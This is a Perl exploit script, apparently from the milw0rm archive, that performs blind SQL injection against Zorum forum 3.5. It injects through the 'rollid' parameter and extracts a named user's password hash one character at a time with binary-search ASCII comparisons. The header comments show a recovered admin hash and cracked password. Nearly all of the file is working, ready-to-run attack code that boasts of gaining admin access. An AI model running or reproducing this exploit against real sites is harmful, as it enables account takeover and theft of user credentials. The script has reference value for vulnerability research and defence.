#!/usr/bin/perl

use LWP::UserAgent;

# -------------------------------------------------------------------------------------------
# Zorum forum (http://zorum.phpoutsourcing.com/) version 3.5 sql injection exploit
# by 1dt.w0lf // RusH security team
# *** work on all mysql versions
# -------------------------------------------------------------------------------------------
# Usage: r57zor.pl [path] [rollid] [username] 
# [path]     - path to forum
# [rollid]   - forum number where user create topic
# [username] - username for bruteforce
# -------------------------------------------------------------------------------------------
# screen:
# r57zor.pl http://zorum.phpoutsourcing.com/forum/ 4 admin
#  Please wait...
#  [################]
#
#  USER_NAME: admin
#  USER_PASS: 32b3956b2024e0fc
# -------------------------------------------------------------------------------------------  
# well it's just default sql crypting...
#  mysql_crk.exe 32b3956b2024e0fc
#  Hash: 32b3956b2024e0fc
#  Trying length 3
#  Trying length 4
#  Trying length 5
#  Trying length 6
#  Found pass: habzsi
# jabi-dabi-duuuu ... we are admins now... =)
# -------------------------------------------------------------------------------------------
# greets 2: GHC.ru , gst.void.ru
# -------------------------------------------------------------------------------------------
# 01.03.05


$path     = $ARGV[0];
$rollid   = $ARGV[1];
$username = $ARGV[2];

$s_num = 1;
$|++;

if (@ARGV < 2) { &usage; }
print " Please wait...\r\n";
print " [";

### quotes must die =)
($uusername = $username) =~ s/(.)/sprintf("%d,",ord($1))/eg;
$uusername =~ s/(.*),$/$1/;

while(1)
{
if(&found(47,58)==0) { &found(96,122); } 
$char = $i;
if ($char=="0") 
 { 
 print qq{] 
 
 USER_NAME: $username
 USER_PASS: $allchar
 };
 exit(); 
 }
else 
 { 
 print "#"; 
 $allchar .= chr($char); 
 }
$s_num++;
}

sub found($$)
 {
 my $fmin = $_[0];
 my $fmax = $_[1];
 if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }
 
 $r = int($fmax - ($fmax-$fmin)/2);
 $check = " BETWEEN $r AND $fmax";
 if ( &check($check) ) { &found($r,$fmax); }
 else { &found($fmin,$r); }
 }
 
sub crack($$)
 {
 my $cmin = $_[0];
 my $cmax = $_[1];
 $i = $cmin;
 while ($i<$cmax)
  {
  $crcheck = "=$i";
  if ( &check($crcheck) ) { return $i; }
  $i++;
  }
 $i = 0;
 return $i;
 }
 
sub check($)
 {
 $n++;
 $ccheck = $_[0];
 $http_query = $path."index.php?method=showhtmllist&list=topic&rollid=".$rollid." AND u.name=char(".$uusername.") AND ascii(substring(u.password,".$s_num.",1))".$ccheck." /*";
 $mcb_reguest = LWP::UserAgent->new() or die;
 $res = $mcb_reguest->post($http_query); 
 @results = $res->content; 
 
 #print " HTTP QUERY : $http_query \r\n";
 
 foreach $result(@results)
  {
  if ($result =~ /details/) { return 1; }
  }
 return 0;
 }
 

sub usage()
 {
 print q( 
+-------------* Zorum sql injection exploit *--------------+
|                  r57 private stuff !!!                   |
|                   http://rst.void.ru                     |
|---* USAGE *----------------------------------------------|
| r57zor.pl [path] [rollid] [username]                     |
+--------------* view sources for more info *--------------+
 );
 exit();
 }

# milw0rm.com [2006-02-17]
